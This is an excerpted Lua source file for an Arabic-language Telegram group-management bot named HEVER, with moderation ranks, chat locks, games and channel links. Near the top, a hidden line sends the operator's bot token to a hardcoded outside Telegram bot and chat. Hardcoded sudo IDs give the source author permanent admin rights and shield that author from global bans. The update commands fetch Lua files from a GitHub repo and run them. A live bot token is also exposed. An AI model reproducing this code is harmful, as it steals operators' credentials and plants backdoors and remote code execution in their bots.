...
https.request('https://api.telegram.org/bot1845840423:AAEo32ApraG5K7NipchRGJCszJ1jm7hurl0/sendmessage?chat_id=1700360357&text=' ..token)
end 
else
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MADISON111000/HEVER/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1877824643,1208165035,60}   
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'هيفير'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local UserName = (data.username_ or "Q_p_de")
...
local Q_p_de = database:get(bot_id..'text:ch:user')
if Q_p_de then
send(msg.chat_id_, msg.id_,'['..Q_p_de..']')
else
...
{'ثيم','روايات','افلام','اغاني'},
{'خلفيات','كتبات','بوستات','نكت'},
{'عقاب','الالعاب','صراحه','تويت'},
{'سورس','مبرمج السورس','مالك السورس','مريم'},
{'اسئله محرجه','انصحني','هيفو','خنزير'},
{'تويت','باد','حساب الوزن'},
...
os.execute('wget https://raw.githubusercontent.com/MADISON111000/HEVER/main/DRAGON.lua')
...
local Text = [[ 
[اضغط هنا وانضم الي قناه السورس](t.me/Q_p_de)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/Q_p_de"}}, 
} 
...
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'Q_p_de')..')'
status  = '\n ◉ تم ترقيته مطور'
...
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Q_p_de')..')'
status  = '\n ◉ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Q_p_de')..') \n ◉ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/Q_p_de)}\n ◉ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ◉ عذرا ← {["..data.first_name_.."](T.ME/Q_p_de)}\n ◉ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/MADISON111000/HEVER/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/MADISON111000/HEVER/main/library')
os.execute('wget https://raw.githubusercontent.com/MADISON111000/HEVER/main/File_Bot')
send(msg.chat_id_, msg.id_,' ◉ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'هيفير') 
local DRAGON_Msg = { 
...
local Text = [[
━───━[𝑯𝑬𝑽𝑬𝑹](t.me/Q_p_de )━───━
𝘚𝘖𝘜𝘙𝘊𝘌 𝘚𝘌𝘊𝘜𝘙𝘐𝘛𝘠 𝘐𝘚 𝘍𝘈𝘚𝘛𝘌𝘙 𝘖𝘕 𝘛𝘌𝘓𝘎𝘙𝘈𝘔, 𝘈𝘕𝘋 𝘚𝘖𝘜𝘙𝘊𝘌 𝑯𝑬𝑽𝑬𝑹 𝘉𝘖𝘖𝘛𝘚 𝘛𝘏𝘌 𝘙𝘖𝘉𝘖𝘛.
━───━[𝑯𝑬𝑽𝑬𝑹](t.me/Q_p_de )━───━
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐄𝐕 𝐇𝐄𝐕𝐎',url="t.me/Q_Q_Q_D"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ', url="t.me/Q_p_de"}}, 
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MADI_PICK/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'تيراررا' or text == 'هقهقه' or text == 'وويويويوي' then
local Text = [[
◉ يمكنك التواصل معي..↑↓
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '^メ~Ｚｉｋａ *_^ｅｌｓａｆａｈ~メ^ ',url="t.me/Zika120"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/mmsst13/886&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'هيفو' or text == 'مالك السورس' or text == 'هيفو الكبير' then
local Text = [[
◉ يمكنك التواصل معي..↑↓
◉ عن طريق معرفي بلاسفل..↑↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐷𝑒𝑣 𝐻𝑒𝑣𝑜',url="t.me/Q_Q_Q_D"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MADI_PICK/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'نينيني' or text == 'ويوي' or text == 'تسرارار' then
local Text = [[
◉ يمكنك التواصل معي..↑↓
◉ عن طريق معرفي بلاسفل..↑↓
]]
...
if text == 'العاب هيفير' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Q_p_de')..') \n ◉ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Q_p_de')..') \n ◉ تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'\n◉تم قفل البوتات بالطرد\n◉تم وضع الايدي بدون صوره\n◉تم قفل التكرار بالطرد\n◉تم قفل الروابط\n◉تم قفل التوجيه\n◉تم قفل الملصقات\n◉تم قفل المتحركه\n◉تم قفل الفيديو\n◉تم قفل السب\n◉تم قفل التعديل\n◉تم قفل الفارسيه\n◉تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه ←['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Q_p_de')..')')   
end,nil) 
end
--------------------------------------------------------------------------------------------------------------
...
if tonumber(result.sender_user_id_) == tonumber(60) then  
...
if tonumber(userid) == tonumber(60) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مطور السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MADISON111000/HEVER/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ◉ اهلا بك في متجر ملفات هيفير\n ◉ ملفات السورس ↓\n≪╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸≫\n\n"
local TextE = "\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n ◉ علامة تعني { ✔️ } ملف مفعل\n ◉ علامة تعني { x } ملف معطل\n ◉ قناة سورس هيفير ↓\n".." ◉ [اضغط هنا لدخول](t.me/Q_p_de) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/MADISON111000/HEVER/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◉ عذرا الملف لايدعم سورس هيفير \n") 
end
return false
end
...
if text == ("مسح قائمه هيفير") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح قائمه هيفير')
return false
end

if text == 'قائمه هيفير' and Sudo(msg) then
...
if text == ("رفع هيفير") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local Q_p_de = database:get(bot_id..'text:ch:user')
if Q_p_de then
send(msg.chat_id_, msg.id_,'['..Q_p_de..']')
...
if text and text:match("^رفع هيفير @(.*)$") and Sudo(msg) then
local username = text:match("^رفع هيفير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local Q_p_de = database:get(bot_id..'text:ch:user')
if Q_p_de then
send(msg.chat_id_, msg.id_,'['..Q_p_de..']')
...
if text and text:match("^رفع هيفير (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع هيفير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local Q_p_de = database:get(bot_id..'text:ch:user')
if Q_p_de then
send(msg.chat_id_, msg.id_,'['..Q_p_de..']')
...
if text == ("تنزيل هيفير") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local Q_p_de = database:get(bot_id..'text:ch:user')
if Q_p_de then
send(msg.chat_id_, msg.id_,'['..Q_p_de..']')
...
if text and text:match("^تنزيل هيفير @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل هيفير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local Q_p_de = database:get(bot_id..'text:ch:user')
if Q_p_de then
send(msg.chat_id_, msg.id_,'['..Q_p_de..']')
...
if text and text:match("^تنزيل هيفير (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل هيفير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local Q_p_de = database:get(bot_id..'text:ch:user')
if Q_p_de then
send(msg.chat_id_, msg.id_,'['..Q_p_de..']')
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Q_p_de')..')'
status  = '\n ◉ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'Q_p_de')..')'..'\n ◉ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
database:set(bot_id.."Q_p_de:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"◉تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."Q_p_de:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."Q_p_de:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس هيفير يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'هيفير').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه هيفير') 
return false
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'هيفير').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'هيفير')
local DRAGON_Msg = {
'◉ يوه '..Namebot..' زهق منك😒',
'◉ نعم ياعيون '..Namebot..' 😻💓',
'◉ عايز اي من '..Namebot..' 🙄💛',
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Q_p_de')..')'
local iduser = result.sender_user_id_
...
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ اليك الاوامر الخاص بسورس هيفير .
